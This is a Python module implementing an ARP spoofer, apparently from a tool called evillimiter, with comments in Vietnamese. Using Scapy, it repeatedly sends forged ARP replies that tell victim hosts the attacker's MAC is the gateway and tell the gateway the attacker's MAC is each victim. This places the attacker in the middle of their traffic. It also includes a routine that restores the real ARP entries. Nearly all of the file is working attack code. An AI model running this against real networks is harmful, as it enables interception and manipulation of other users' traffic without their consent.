import time
import threading
import logging
from typing import Set, List, Optional

# Scapy imports
from scapy.all import Ether, ARP, sendp, get_if_hwaddr  # Import hết ở đây 1 lần

# Project imports
from .host import Host
from evillimiter.common.globals import BROADCAST

logger = logging.getLogger(__name__)


class ARPSpoofer:
    def __init__(self, interface: str, gateway_ip: str, gateway_mac: str, interval: float = 2.0):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.interval = interval

        self._hosts: Set[Host] = set()
        self._hosts_lock = threading.Lock()
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None

    def add(self, host: Host) -> None:
        with self._hosts_lock:
            self._hosts.add(host)
        host.spoofed = True
        logger.debug(f"Added host {host.ip} to spoof list.")

    def remove(self, host: Host, restore: bool = True) -> None:
        with self._hosts_lock:
            self._hosts.discard(host)
        host.spoofed = False
        if restore:
            self._restore(host)
            logger.debug(f"Removed and restored host {host.ip}.")
        else:
            logger.debug(f"Removed host {host.ip} without restore.")

    def start(self) -> None:
        if self._thread and self._thread.is_alive():
            return
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._spoof_loop, daemon=True, name="ARPSpooferThread")
        self._thread.start()
        logger.info("ARP Spoofer started.")

    def stop(self) -> None:
        self._stop_event.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=2.0)
        logger.info("ARP Spoofer stopped.")

    def _spoof_loop(self) -> None:
        while not self._stop_event.is_set():
            with self._hosts_lock:
                current_hosts = list(self._hosts)

            if not current_hosts:
                self._stop_event.wait(self.interval)
                continue

            all_packets = []
            for host in current_hosts:
                if host.mac:
                    all_packets.extend(self._create_spoof_packets(host))

            if all_packets:
                try:
                    sendp(all_packets, verbose=False, iface=self.interface)
                except Exception as e:
                    logger.error(f"Error sending spoof packets: {e}")

            self._stop_event.wait(self.interval)

    def _create_spoof_packets(self, host: Host) -> List[Ether]:
        """Tạo 2 gói ARP spoof: lừa victim + lừa gateway"""
        attacker_mac = get_if_hwaddr(self.interface)

        pkt_to_victim = (
            Ether(dst=host.mac) /
            ARP(
                op=2,
                hwsrc=attacker_mac,      # Attacker giả làm gateway
                psrc=self.gateway_ip,
                hwdst=host.mac,
                pdst=host.ip
            )
        )

        pkt_to_gateway = (
            Ether(dst=self.gateway_mac) /
            ARP(
                op=2,
                hwsrc=attacker_mac,      # Attacker giả làm victim
                psrc=host.ip,
                hwdst=self.gateway_mac,
                pdst=self.gateway_ip
            )
        )

        return [pkt_to_victim, pkt_to_gateway]

    def _restore(self, host: Host) -> None:
        """Khôi phục ARP table về đúng (gửi gói thật)"""
        if not host.mac:
            return

        logger.info(f"Restoring ARP table for {host.ip}...")

        # Gói thật gửi đến victim: Gateway IP → Gateway MAC thật
        pkt1 = Ether(dst=host.mac) / ARP(
            op=2,
            hwsrc=self.gateway_mac,
            psrc=self.gateway_ip,
            hwdst=host.mac,
            pdst=host.ip
        )

        # Gói thật gửi đến gateway: Victim IP → Victim MAC thật
        pkt2 = Ether(dst=self.gateway_mac) / ARP(
            op=2,
            hwsrc=host.mac,
            psrc=host.ip,
            hwdst=self.gateway_mac,
            pdst=self.gateway_ip
        )

        # Gửi nhiều lần để chắc chắn (4 lần, cách nhau 0.2s)
        try:
            sendp(pkt1 * 4, iface=self.interface, inter=0.2, verbose=False)
            sendp(pkt2 * 4, iface=self.interface, inter=0.2, verbose=False)
        except Exception as e:
            logger.error(f"Error restoring host {host.ip}: {e}")

    # Context manager support
    def __enter__(self):
        self.start()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.stop()